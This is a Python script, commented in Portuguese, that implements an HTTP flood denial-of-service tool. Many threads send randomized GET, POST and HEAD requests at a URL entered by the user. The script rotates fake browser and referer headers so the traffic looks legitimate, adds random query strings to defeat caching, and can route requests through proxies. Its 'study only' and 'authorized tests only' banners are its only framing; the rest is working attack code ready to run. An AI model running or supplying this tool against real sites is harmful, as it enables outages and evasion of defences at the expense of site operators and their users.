#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
HTTP Flood Attack Tool - APENAS PARA ESTUDO
"""

import requests
import threading
import time
import random
from colorama import Fore, Style, init

init(autoreset=True)

class HTTPFlood:
    def __init__(self, target, threads=10, duration=60, proxy_list=None):
        """
        Inicializa o ataque HTTP Flood
        
        Args:
            target (str): URL alvo (ex: http://exemplo.com)
            threads (int): Número de threads
            duration (int): Duração em segundos
            proxy_list (list): Lista de proxies opcional
        """
        self.target = target
        self.threads = threads
        self.duration = duration
        self.proxy_list = proxy_list or []
        self.running = False
        self.packets_sent = 0
        self.session = requests.Session()
        
        # Headers comuns para parecer tráfego legítimo
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15',
        ]
        
        self.referers = [
            'https://google.com',
            'https://bing.com',
            'https://yahoo.com',
            'https://duckduckgo.com',
            None
        ]
    
    def get_random_headers(self):
        """Gera headers aleatórios"""
        return {
            'User-Agent': random.choice(self.user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'pt-BR,pt;q=0.9,en;q=0.8',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Referer': random.choice(self.referers) if random.choice([True, False]) else '',
            'Cache-Control': 'no-cache' if random.choice([True, False]) else 'max-age=0'
        }
    
    def attack_worker(self, thread_id):
        """Trabalhador individual (thread)"""
        local_packets = 0
        errors = 0
        
        print(f"{Fore.CYAN}[Thread {thread_id}] Iniciada")
        
        while self.running:
            try:
                # Escolher método aleatório
                method = random.choice(['GET', 'POST', 'HEAD'])
                
                # Preparar request
                headers = self.get_random_headers()
                
                # Adicionar parâmetros aleatórios para evitar cache
                url = self.target
                if random.choice([True, False]):
                    url += f"?rand={random.randint(1, 999999)}&t={int(time.time())}"
                
                # Usar proxy se disponível
                proxies = None
                if self.proxy_list:
                    proxy = random.choice(self.proxy_list)
                    proxies = {'http': proxy, 'https': proxy}
                
                # Fazer request baseado no método
                if method == 'GET':
                    response = self.session.get(url, headers=headers, proxies=proxies, timeout=5)
                elif method == 'POST':
                    data = {f'field_{i}': random.randint(1, 1000) for i in range(5)}
                    response = self.session.post(url, headers=headers, data=data, proxies=proxies, timeout=5)
                else:  # HEAD
                    response = self.session.head(url, headers=headers, proxies=proxies, timeout=5)
                
                local_packets += 1
                
                # Feedback visual
                if response.status_code == 200:
                    print(f"{Fore.GREEN}[Thread {thread_id}] ✓ {method} {response.status_code}")
                else:
                    print(f"{Fore.YELLOW}[Thread {thread_id}] ⚠ {method} {response.status_code}")
                
            except requests.exceptions.Timeout:
                errors += 1
                print(f"{Fore.YELLOW}[Thread {thread_id}] ⏰ Timeout")
            except requests.exceptions.ConnectionError:
                errors += 1
                print(f"{Fore.RED}[Thread {thread_id}] 🔌 Erro de conexão")
            except Exception as e:
                errors += 1
                print(f"{Fore.RED}[Thread {thread_id}] ❌ Erro: {str(e)[:50]}")
            
            # Pequena pausa para não sobrecarregar
            time.sleep(random.uniform(0.01, 0.1))
        
        print(f"{Fore.MAGENTA}[Thread {thread_id}] Finalizada - {local_packets} pacotes, {errors} erros")
    
    def start(self):
        """Inicia o ataque"""
        print(f"""
{Fore.RED}╔════════════════════════════════════════╗
║     INICIANDO HTTP FLOOD              ║
╠════════════════════════════════════════╣
║ Alvo: {self.target[:30]:<30} ║
║ Threads: {self.threads:<29} ║
║ Duração: {self.duration}s {' ' * 21}║
╚════════════════════════════════════════╝{Style.RESET_ALL}
        """)
        
        self.running = True
        threads = []
        
        # Criar e iniciar threads
        for i in range(self.threads):
            t = threading.Thread(target=self.attack_worker, args=(i,))
            t.daemon = True
            t.start()
            threads.append(t)
            time.sleep(0.1)  # Espaçar início das threads
        
        # Monitorar por X segundos
        start_time = time.time()
        try:
            while time.time() - start_time < self.duration:
                time.sleep(1)
                elapsed = int(time.time() - start_time)
                remaining = self.duration - elapsed
                print(f"{Fore.CYAN}[⏱️] Tempo: {elapsed}s decorridos | {remaining}s restantes")
        
        except KeyboardInterrupt:
            print(f"{Fore.YELLOW}\n[!] Ataque interrompido pelo usuário")
        
        finally:
            self.stop()
    
    def stop(self):
        """Para o ataque"""
        self.running = False
        print(f"{Fore.GREEN}[✓] Ataque HTTP Flood finalizado")

if __name__ == "__main__":
    # Exemplo de uso
    print(f"{Fore.RED}⚠️  APENAS PARA TESTES AUTORIZADOS! ⚠️")
    target = input("Digite o alvo (URL): ")
    
    if target:
        attack = HTTPFlood(
            target=target,
            threads=50,
            duration=30
        )
        attack.start()
